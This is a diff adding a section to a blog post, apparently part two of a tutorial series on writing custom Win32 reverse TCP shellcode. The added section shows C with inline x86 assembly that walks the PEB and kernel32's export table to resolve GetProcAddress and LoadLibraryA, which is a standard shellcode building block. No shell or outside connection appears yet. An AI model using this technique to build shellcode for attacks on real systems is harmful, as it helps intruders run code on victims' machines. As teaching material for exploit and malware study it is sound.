@@ -304,6 +304,86 @@ At seventh line, we have the correct index for the <code  style="background-colo
 </p>
 
 <p align="justify">
+at this point we can see the full program we have implemented so far from the previous blog posts until now 
+
+</p>
+
+```c
+#include <windows.h>
+
+int main(int argc, char* argv[])
+{
+    LoadLibrary("user32.dll");
+    _asm
+    {
+        // Locate Kernelbase.dll address
+        XOR ECX, ECX              // zero out ECX
+        MOV EAX, FS:[ecx + 0x30]  // EAX = PEB
+        MOV EAX, [EAX + 0x0c]     // EAX = PEB->Ldr
+        MOV ESI, [EAX + 0x14]     // ESI = PEB->Ldr.InMemoryOrderModuleList
+        LODSD                     // memory address of the second list entry structure
+        XCHG EAX, ESI             // EAX = ESI , ESI = EAX 
+        LODSD                     // memory address of the third list entry structure
+        XCHG EAX, ESI             // EAX = ESI , ESI = EAX 
+        LODSD                     // memory address of the fourth list entry structure
+        MOV EBX, [EAX + 0x10]     // EBX = Base address
+
+
+        // Export Table 
+        MOV EDX, DWORD PTR DS : [EBX + 0x3C]    //EDX = DOS->e_lfanew
+        ADD EDX, EBX                            //EDX = PE Header
+        MOV EDX, DWORD PTR DS : [EDX + 0x78]    //EDX = Offset export table
+        ADD EDX, EBX                            //EDX = Export table
+        MOV ESI, DWORD PTR DS : [EDX + 0x20]    //ESI = Offset names table
+        ADD ESI, EBX                            //ESI = Names table
+        XOR ECX, ECX                            //EXC = 0
+
+        GetFunction :
+
+        INC ECX; increment counter
+        LODSD                               //Get name offset
+        ADD EAX, EBX                        //Get function name
+        CMP[EAX], 0x50746547                //"PteG"
+        JNZ SHORT GetFunction               //jump to GetFunction label if not "GetP"
+        CMP[EAX + 0x4], 0x41636F72          //"rocA"
+        JNZ SHORT GetFunction               //jump to GetFunction label if not "rocA"
+        CMP[EAX + 0x8], 0x65726464          //"ddre"
+        JNZ SHORT GetFunction               //jump to GetFunction label if not "ddre"
+
+        MOV ESI, DWORD PTR DS : [EDX + 0x24]    //ESI = Offset ordinals
+        ADD ESI, EBX                            //ESI = Ordinals table
+        MOV CX, WORD PTR DS : [ESI + ECX * 2]   //CX = Number of function
+        DEC ECX                                 //Decrement the ordinal
+        MOV ESI, DWORD PTR DS : [EDX + 0x1C]    //ESI = Offset address table
+        ADD ESI, EBX                            //ESI = Address table
+        MOV EDX, DWORD PTR DS : [ESI + ECX * 4] //EDX = Pointer(offset)
+        ADD EDX, EBX                            //EDX = GetProcAddress
+
+        // Get the Address of LoadLibraryA function 
+        XOR ECX, ECX                        //ECX = 0
+        PUSH EBX                            //Kernel32 base address
+        PUSH EDX                            //GetProcAddress
+        PUSH ECX                            //0
+        PUSH 0x41797261                     //"Ayra"
+        PUSH 0x7262694C                     //"rbiL"
+        PUSH 0x64616F4C                     //"daoL"
+        PUSH ESP                            //"LoadLibrary"
+        PUSH EBX                            //Kernel32 base address
+        MOV  ESI, EBX                       //save the kernel32 address in esi for later
+        CALL EDX                            //GetProcAddress(LoadLibraryA)
+    }
+    return 0;
+}
+
+```
+
+<p align="justify">
+And if we load the <code  style="background-color: lightgrey; color:black;">testasm.exe</code> in Windbg debugger, we will see that after the last instruction <code  style="background-color: lightgrey; color:black;">CALL EDX</code> executed, the <code  style="background-color: lightgrey; color:black;">eax</code> register will finally hold the return value from the <code  style="background-color: lightgrey; color:black;">GetProcAddress</code> function, which will be the address of the <code  style="background-color: lightgrey; color:black;">LoadLobraryA</code> function. 
+</p>
+
+<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="https://xen0vas.github.io/assets/images/2021/07/WinDbg-EAX-LoadLibraryA.png" alt="WinDbg debugging"  />
+
+<p align="justify">
 This was the second part of the <i>custom win32 reverse tcp shellcode development</i> series. At this second part, we have achieved to be in a position to use the <code  style="background-color: lightgrey; color:black;">GetProcAddress</code> function from <code  style="background-color: lightgrey; color:black;">Kernel32.dll</code> library. In conclusion, after reading this post, we understand that we are at the point where we can use the <code  style="background-color: lightgrey; color:black;">GetProcAddress</code> function, and this is a crucial part before we continue with the reverse tcp shellcode construction, as we will see in a later blog post. What is  important here, is that we are now able to find the address of  <code  style="background-color: lightgrey; color:black;">LoadLibraryA</code> function, which can help us loading other libraries where we can further use their functions. At the thirt part of this <i>custom win32 reverse tcp shellcode development</i> series, we will be focusing on the rest of the construction of the reverse tcp shellcode. 
 </p>
 
